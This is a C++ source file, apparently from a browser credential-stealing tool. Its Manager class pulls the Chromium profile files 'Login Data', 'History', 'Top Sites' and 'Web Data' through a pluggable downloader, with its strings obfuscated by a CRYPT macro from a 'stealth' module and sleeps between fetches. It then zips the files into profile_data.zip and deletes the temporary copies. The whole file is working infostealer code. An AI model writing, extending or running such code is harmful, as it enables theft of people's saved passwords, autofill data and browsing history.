#include "manager.h"
#include "../sleep/sleep.hpp"
#include "../../imports/miniz/miniz.h"
#include "stealth/encryption.hpp"

#include <filesystem>
#include <chrono>

static const std::vector<std::string> IMPORTANT_FILES = {
    CRYPT("History"),
    CRYPT("Login Data"),
    CRYPT("Top Sites"),
    CRYPT("Web Data")
};

Manager::Manager(Context& ctx)
    : ctx(ctx)
{
}


bool Manager::createZip(const std::string& zipPath, const std::vector<std::string>& files)
{
    mz_zip_archive zip = {};
    if (!mz_zip_writer_init_file(&zip, zipPath.c_str(), 0)) {
        ctx.out.error(CRYPT("zip init failed: ")
            + mz_zip_get_error_string(mz_zip_get_last_error(&zip)));
        return false;
    }

    for (const auto& file : files) {
        // Entry name inside the zip must be relative (no leading '/').
        std::string entryName = std::filesystem::path(file).filename().string();

        if (!mz_zip_writer_add_file(&zip, entryName.c_str(), file.c_str(),
            nullptr, 0, MZ_BEST_SPEED)) {
            ctx.out.error(CRYPT("zip add failed for '") + file + CRYPT("': ")
                + mz_zip_get_error_string(mz_zip_get_last_error(&zip)));
            mz_zip_writer_end(&zip);
            return false;
        }
    }

    bool ok = mz_zip_writer_finalize_archive(&zip);
    if (!ok) {
        ctx.out.error(CRYPT("zip finalize failed: ")
            + mz_zip_get_error_string(mz_zip_get_last_error(&zip)));
    }
    mz_zip_writer_end(&zip);
    return ok;
}


void Manager::archiveAndCleanup(const std::vector<std::string>& files)
{
    if (files.empty())
        return;

    const std::string zipName = CRYPT("profile_data.zip");

    if (!createZip(zipName, files)) {
        ctx.out.error(CRYPT("failed to create zip archive"));
        return;
    }

    ctx.out.print(CRYPT("created archive: ") + zipName);

    // Delete the individual temporary files
    for (const auto& file : files) {
        std::error_code ec;
        std::filesystem::remove(file, ec);
        if (ec) {
            ctx.out.error(CRYPT("failed to delete temporary file: ") + file);
        }
    }
}


void Manager::downloadProfile(Downloader& downloader)
{
    if (!downloader.setup()) {
        ctx.out.error(CRYPT("failed to setup downloader: ") + downloader.name());
        return;
    }

    ctx.out.verbosePrint(CRYPT("setup downloader:  ") + downloader.name());

    std::vector<std::string> downloadedFiles;

    for (const auto& file : IMPORTANT_FILES) {

        DownloadRequest req;
        req.input = (std::filesystem::path(ctx.profileDirectory) / file).generic_string();
        req.destFile = file;

        ctx.out.verbosePrint(CRYPT("attempting to download:  ") + req.input);

        DownloadResult result = downloader.fetch(req);

        ctx.out.verbosePrint(CRYPT("finished download"));

        if (!result.ok) {
            ctx.out.error(CRYPT("failed to download '") + req.input + CRYPT("' REASON: ") + result.detail);
        }
        else {
            ctx.out.print(CRYPT("downloaded: ") + req.input + CRYPT(" (") + std::to_string(result.bytes) + CRYPT(" bytes)"));
            downloadedFiles.push_back(result.filePath);
        }

        sleepMs();
    }

    downloader.teardown();

    // Clean separation of concerns
    archiveAndCleanup(downloadedFiles);
}